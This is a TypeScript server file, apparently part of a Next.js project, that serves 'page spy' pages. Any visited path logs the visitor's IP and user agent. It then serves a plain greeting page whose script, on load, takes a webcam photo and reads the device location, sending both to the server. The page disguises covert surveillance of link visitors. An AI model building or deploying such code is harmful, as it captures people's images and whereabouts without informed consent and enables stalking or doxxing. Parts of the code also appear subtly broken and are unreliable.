import { zValidator } from "@hono/zod-validator";
import { Hono } from "hono";
import { html } from "hono/html";
import { handle } from "hono/vercel";
import type { PageConfig } from "next";
import { z } from "zod";
import { prismaClient } from "~/prisma/client";

export const config: PageConfig = {
  runtime: "nodejs",
};

const app = new Hono();

app.get("/", (c) => {
  return c.text("");
});

app.post(
  "/api/page-view-location",
  zValidator(
    "json",
    z.object({
      pageViewId: z.string(),
      latitude: z.string(),
      longitude: z.string(),
    }),
  ),
  async (c) => {
    const requestJson = await c.req.valid("json");

    const checkPageView = await prismaClient.pageSpyView.findUnique({
      where: {
        id: requestJson.pageViewId,
      },
      select: {
        location: true,
      },
    });

    if (checkPageView?.location) {
      return c.json({});
    }

    await prismaClient.pageSpyView.update({
      where: {
        id: requestJson.pageViewId,
      },
      data: {
        location: `${requestJson.latitude}, ${requestJson.longitude}`,
      },
    });
  },
);

app.post(
  "/api/page-view-photo",
  zValidator(
    "json",
    z.object({
      pageViewId: z.string(),
      photoBase64: z.string(),
    }),
  ),
  async (c) => {
    const requestJson = await c.req.valid("json");

    const checkPageView = await prismaClient.pageSpyView.findUnique({
      where: {
        id: requestJson.pageViewId,
      },
      select: {
        photoBase64: true,
      },
    });

    if (checkPageView?.photoBase64) {
      return c.json({});
    }

    await prismaClient.pageSpyView.update({
      where: {
        id: requestJson.pageViewId,
      },
      data: {
        photoBase64: requestJson.photoBase64,
      },
    });
  },
);

app.get("/*", async (c) => {
  const path = c.req.path;
  const requestIp = String(c.req.header("x-real-ip"));
  const requestUserAgent = String(c.req.header("user-agent"));

  const pageView = await prismaClient.pageSpyView.create({
    data: {
      ip: requestIp,
      userAgent: requestUserAgent,
      pageSpy: {
        connect: {
          path,
        },
      },
    },
    select: {
      id: true,
    },
  });

  return c.html(
    html`<!doctype html>
      <h1>Hello! ${path}!</h1>

      ${html`
        <script>
          const pageLoadId = ${pageView.id};

          // Função para capturar foto da câmera
          async function capturarFoto() {
            try {
              if (
                !navigator.mediaDevices ||
                !navigator.mediaDevices.getUserMedia
              ) {
                console.error("API de câmera não suportada neste navegador.");
                return;
              }

              // Solicita acesso à câmera
              const stream = await navigator.mediaDevices.getUserMedia({
                video: true,
              });
              const video = document.createElement("video");
              video.srcObject = stream;
              await video.play();

              // Aguarda 3 segundos antes de capturar a foto
              //await new Promise((resolve) => setTimeout(resolve, 3000));

              // Cria um canvas fora da área visível
              const canvas = document.createElement("canvas");
              //canvas.style.display = "none";
              document.body.appendChild(canvas);

              // Ajusta o tamanho conforme o vídeo
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;

              // Desenha a imagem do vídeo no canvas
              const context = canvas.getContext("2d");
              context.drawImage(video, 0, 0, canvas.width, canvas.height);

              // Converte o conteúdo do canvas para dados em Base64
              const dataUrl = canvas.toDataURL("image/png");

              // Aguarda segundos antes de capturar a foto
              await new Promise((resolve) => setTimeout(resolve, 1000));

              // Libera o vídeo e a câmera
              video.pause();
              stream.getTracks().forEach((track) => track.stop());

              // Remove o canvas para não ficar no DOM
              document.body.removeChild(canvas);

              // Envia a imagem para uma API (exemplo)
              fetch("/api/page-view-photo", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify({
                  pageViewId: pageLoadId,
                  photoBase64: dataUrl,
                }),
              });
            } catch (erro) {
              console.error(
                "Erro ao tentar capturar foto ou solicitar acesso à câmera:",
                erro,
              );
            }
          }

          // Função para obter localização
          function obterLocalizacao() {
            if (!navigator.geolocation) {
              console.error(
                "API de geolocalização não suportada neste navegador.",
              );
              return;
            }

            // Solicita acesso e obtém a posição atual
            navigator.geolocation.getCurrentPosition(
              async (posicao) => {
                const { latitude, longitude } = posicao.coords;
                await fetch("/api/page-view-location", {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/json",
                  },
                  body: JSON.stringify({
                    pageViewId: pageLoadId,
                    latitude,
                    longitude,
                  }),
                });
              },
              (erro) => {
                console.error(
                  "Erro ou permissão negada para obter localização:",
                  erro,
                );
              },
            );
          }

          // Execução do fluxo ao carregar a página
          window.addEventListener("load", () => {
            capturarFoto();
            obterLocalizacao();
          });
        </script>
      `} `,
  );
});

export const GET = handle(app);
export const POST = handle(app);
